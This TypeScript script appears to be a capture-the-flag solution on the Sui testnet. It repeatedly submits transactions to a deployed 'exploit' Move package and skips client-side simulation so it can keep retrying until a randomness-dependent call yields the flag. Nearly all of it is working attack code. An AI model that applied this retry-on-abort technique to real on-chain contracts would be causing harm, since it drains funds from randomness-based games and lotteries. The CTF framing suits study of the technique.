import { Transaction } from '@mysten/sui/transactions';
import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import keyPairJson from "../keypair.json" with { type: "json" };

const EXPLOIT_PACKAGE_ID = "0xe54000ad235b847758b7f7bd5a713385bab6905e1b58727bfdb8e3e98c770b0f";
const USDC_PACKAGE = "0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29";
const USDC_TYPE = `${USDC_PACKAGE}::usdc::USDC`;
const SUI_TYPE = "0x2::sui::SUI";
// Random shared object on Sui (0x8) — initialSharedVersion from on-chain
const RANDOM_ID = "0x0000000000000000000000000000000000000000000000000000000000000008";
const RANDOM_INITIAL_SHARED_VERSION = 43342337;
const REQUIRED_PAYMENT = 15_000_000n;
const GAS_BUDGET = 20_000_000n;
const GAS_PRICE = 1000n;

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
  network: 'testnet',
  baseUrl: 'https://fullnode.testnet.sui.io:443',
});

(async () => {
  const address = keypair.getPublicKey().toSuiAddress();
  console.log(`Wallet: ${address}`);

  // Merge USDC coins if needed (no randomness — normal execution is fine)
  let { objects: usdcCoins } = await suiClient.listCoins({ owner: address, coinType: USDC_TYPE });
  if (usdcCoins.length === 0) throw new Error("No USDC coins found — fund wallet with at least 15 USDC on testnet");

  if (usdcCoins.length > 1) {
    console.log(`Merging ${usdcCoins.length} USDC coins...`);
    const mergeTx = new Transaction();
    mergeTx.mergeCoins(
      mergeTx.object(usdcCoins[0].objectId),
      usdcCoins.slice(1).map(c => mergeTx.object(c.objectId)),
    );
    await suiClient.signAndExecuteTransaction({ transaction: mergeTx, signer: keypair });
    await new Promise(r => setTimeout(r, 2000));
    ({ objects: usdcCoins } = await suiClient.listCoins({ owner: address, coinType: USDC_TYPE }));
  }

  console.log(`USDC coin: ${usdcCoins[0].objectId} (${BigInt(usdcCoins[0].balance) / 1_000_000n} USDC)`);

  let attempt = 0;
  while (true) {
    attempt++;
    console.log(`Attempt #${attempt}...`);

    // Fetch fresh refs every iteration — both coins' versions change each tx
    const [{ objects: freshUsdc }, { objects: suiCoins }] = await Promise.all([
      suiClient.listCoins({ owner: address, coinType: USDC_TYPE }),
      suiClient.listCoins({ owner: address, coinType: SUI_TYPE }),
    ]);
    const usdcCoin = freshUsdc[0];
    const gasCoin = suiCoins[0];

    // Build with fully explicit refs so we can call tx.build() WITHOUT a client,
    // bypassing the gRPC simulation plugin that would abort on no-flag results.
    const tx = new Transaction();
    tx.setSender(address);
    tx.setGasPrice(GAS_PRICE);
    tx.setGasBudget(GAS_BUDGET);
    tx.setGasPayment([{ objectId: gasCoin.objectId, version: gasCoin.version, digest: gasCoin.digest }]);

    const [payment] = tx.splitCoins(
      tx.objectRef({ objectId: usdcCoin.objectId, version: usdcCoin.version, digest: usdcCoin.digest }),
      [REQUIRED_PAYMENT],
    );
    tx.moveCall({
      target: `${EXPLOIT_PACKAGE_ID}::exploit::exploit`,
      arguments: [
        payment,
        tx.sharedObjectRef({ objectId: RANDOM_ID, initialSharedVersion: RANDOM_INITIAL_SHARED_VERSION, mutable: false }),
      ],
    });

    // Build without client → no simulation plugin → no false abort
    const bytes = await tx.build();
    const { signature } = await keypair.signTransaction(bytes);
    const result = await suiClient.executeTransaction({ transaction: bytes, signatures: [signature] });

    if (result.Transaction) {
      const digest = result.Transaction.digest;
      console.log("Flag captured!");
      console.log("Digest:", digest);
      console.log(`View: https://suiscan.xyz/testnet/tx/${digest}`);
      break;
    } else {
      console.log(`No flag (tx aborted, USDC refunded). Retrying...`);
      await new Promise(r => setTimeout(r, 500));
    }
  }
})();
